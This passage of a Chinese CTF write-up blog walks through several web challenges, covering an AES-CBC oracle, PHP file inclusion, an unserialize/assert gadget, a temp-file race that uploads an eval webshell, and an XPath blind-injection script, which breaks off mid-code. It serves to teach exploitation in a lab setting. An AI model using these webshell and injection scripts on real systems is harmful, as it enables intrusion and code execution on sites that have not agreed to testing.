class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">80</span>, <span class="string">'0.0.0.0'</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Start listening'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="web🐕"><a href="#web🐕" class="headerlink" title="web🐕"></a>web🐕</h2><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我摊牌了，就是懒得写前端"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="超简单的PHP！！！超简单！！！"><a href="#超简单的PHP！！！超简单！！！" class="headerlink" title="超简单的PHP！！！超简单！！！"></a>超简单的PHP！！！超简单！！！</h2><p>查看源码发现index.bak.php</p><p>点进去之后url是<code>http://ha1cyon-ctf.fun:30094/index.bak.php?action=message.php</code></p><p>尝试使用伪协议读取源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.bak.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">'action'</span>];</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">"location:./index.bak.php?action=message.php"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;message.php</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;static&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;X佬留言板&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">&lt;h1&gt;👴过留声 燕过留名&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;!--假的navbar--&gt;</span><br><span class="line">&lt;navbar&gt;</span><br><span class="line">&lt;ul class&#x3D;&quot;nav nav-tabs&quot;&gt;</span><br><span class="line">  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">&lt;a class&#x3D;&quot;nav-link &quot; href&#x3D;&quot;.&#x2F;index.php&quot;&gt;Index&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line">  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">&lt;a class&#x3D;&quot;nav-link table-active &quot; href&#x3D;&quot;.&#x2F;message.php&quot;&gt;Message&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line">  &lt;li class&#x3D;&quot;nav-item&quot;&gt;</span><br><span class="line">&lt;a class&#x3D;&quot;nav-link&quot; href&#x3D;&quot;.&#x2F;phpinfo.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;li&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br><span class="line">&lt;&#x2F;navbar&gt;</span><br><span class="line">&lt;!--假的navbar--&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;form id&#x3D;&quot;message-form&quot;&gt;</span><br><span class="line">&lt;textarea  id&#x3D;&quot;msg&quot; cols&#x3D;&quot;45&quot; rows&#x3D;&quot;3&quot; placeholder&#x3D;&quot;🌶你进群，还不快来👴直接把⚰都给bypass给你看信不信&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msg.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'content-type:application/json'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($msg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strlen($msg)&gt;<span class="number">17</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"msg is too loooong!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="string">"/php/"</span>,<span class="string">"?"</span>,$msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'msg'</span>])&amp;<span class="keyword">empty</span>($_SESSION[<span class="string">'msg'</span>]))$_SESSION[<span class="string">'msg'</span>] = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'msg'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    array_push($_SESSION[<span class="string">'msg'</span>], [<span class="string">'msg'</span>=&gt;safe($_POST[<span class="string">'msg'</span>]),<span class="string">'time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>,time())]);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>([<span class="string">'msg'</span>=&gt;safe($_POST[<span class="string">'msg'</span>]),<span class="string">'time'</span>=&gt;date(<span class="string">'Y-m-d H:i:s'</span>,time())]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_SESSION[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode($_SESSION[<span class="string">'msg'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="keyword">echo</span> <span class="string">"还不快去留言！"</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h2><p>查看源码发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>百万前端的NPU报时中心为您报时：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./time.php?source"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击之后得time.php到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure><p>编写脚本经过测试，部分函数被禁用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"phpinfo()"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"assert"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($c); <span class="comment">//O:8:"HelloPhp":2:&#123;s:1:"a";s:9:"phpinfo()";s:1:"b";s:6:"assert";&#125;</span></span><br></pre></td></tr></table></figure><p>查看phpinfo被禁用如下函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,scadnir,readfile,show_source,fpassthru,readdir</span><br></pre></td></tr></table></figure><p>后面查找发现flag在phpinfo中</p><h2 id="查源码"><a href="#查源码" class="headerlink" title="查源码"></a>查源码</h2><p>url前面加上 view-source:</p><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>查看源码得到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username/password error<span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--md5($secret.$name)===$pass --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>抓包发现cookie里面有一个hash，直接提交即可。</p><p>目录扫描发现了一个dir.php。</p><p>提交之后来到了/flflflflag.php，然后立马跳转到404.html。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">           <span class="built_in">window</span>.location.href=<span class="string">"404.html"</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">include($_GET["file"])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用文件包含查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F;flflflflag.php</span><br><span class="line">html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">           window.location.href&#x3D;&quot;404.html&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">if(preg_match(&#39;&#x2F;data|input|zip&#x2F;is&#39;,$file))&#123;</span><br><span class="line">die(&#39;nonono&#39;);</span><br><span class="line">&#125;</span><br><span class="line">@include($file);</span><br><span class="line">echo &#39;include($_GET[&quot;file&quot;])&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>经过一番查找后，考点是这个<a href="https://www.anquanke.com/post/id/183046" target="_blank" rel="noopener">PHP临时文件机制与利用的思考</a></p><p>利用<a href="https://www.anquanke.com/member/144041" target="_blank" rel="noopener">Mote</a>师傅github中的脚本<a href="https://github.com/Mote-Z/PHP-Is-The-Best/blob/master/PHP_Tempfile_Exploit/POC1/upload.py" target="_blank" rel="noopener">poc1</a>,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">'http://fa1203f5-0c7d-4e2f-8674-c614670aa93f.node3.buuoj.cn/flflflflag.php?file=flflflflag.php'</span></span><br><span class="line">files = &#123;<span class="string">'file'</span> + str(i): (<span class="string">'webshell'</span>, <span class="string">'@&lt;?php @eval($_GET[1]);?&gt;'</span> + <span class="string">'test'</span> + str(i), <span class="string">'text/php'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'Pragma'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'no-cache'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9,en;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            r = s.post(url=url, headers=header, files=files)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ConnectionError:</span><br><span class="line">        print(<span class="string">'Connection Error'</span>)</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    workers = []</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        worker = threading.Thread(target=upload_file, args=())</span><br><span class="line">        worker.start()</span><br><span class="line">        workers.append(worker)</span><br><span class="line">    <span class="keyword">for</span> worker <span class="keyword">in</span> workers:</span><br><span class="line">        worker.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>一直跑，然后在dir.php查看目录文件，再包含shell进去。</p><p><img src="/pic/166.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#x2F;flflflflag.php?file&#x3D;&#x2F;tmp&#x2F;phpylUNtT&amp;1&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p>发现flag在phpinfo中。</p><p><img src="/pic/166.png" alt=""></p><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><p>打开题目，是一个登陆框，随意发送数据后抓包发现传入的数据是xml格式的，猜测是xpath注入。</p><p><img src="/pic/164.png" alt=""></p><p>于是尝试xpath注入万能密码,失败。尝试盲注。发现只能提交一次数据就要刷新。</p><p>当语句执行正确时（<code>&#39; or count(/)=1 or &#39;1</code>），提示非法操作</p><p><img src="/pic/165.png" alt=""></p><p>当语句错误时（<code>&#39; or count(/)=2 or &#39;1</code>）,提示账号或密码错误。</p><p>编写盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">se = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    pattern = <span class="string">'id="token" value="(.*?)" /&gt;'</span></span><br><span class="line">    url = <span class="string">'http://94b8372f-c5d8-4348-afa2-522c9b88f1d8.node3.buuoj.cn/login.php'</span></span><br><span class="line">    headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;</span><br><span class="line">    username = payload</span><br><span class="line">    password = <span class="string">'123'</span></span><br><span class="line">    data = <span class="string">"&lt;username&gt;"</span> + username + <span class="string">"&lt;/username&gt;&lt;password&gt;"</span> + password + <span class="string">"&lt;/password&gt;&lt;token&gt;"</span> + \</span><br><span class="line">           re.findall(pattern, se.get(url).text)[<span class="number">0</span>] + <span class="string">"&lt;/token&gt;"</span></span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    html = se.post(url, headers=headers, data=data)</span><br><span class="line">    <span class="comment"># print(html.text)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(s_payload, len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len:</span><br><span class="line">        dic = string.printable</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'text()'</span> <span class="keyword">in</span> s_payload:</span><br><span class="line">                payload = <span class="string">"' or substring(%s,%d,1)='%s' or '1"</span> % (s_payload, x, s)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                payload = <span class="string">"' or substring(name(%s),%d,1)='%s' or '1"</span> % (s_payload, x, s)</span><br><span 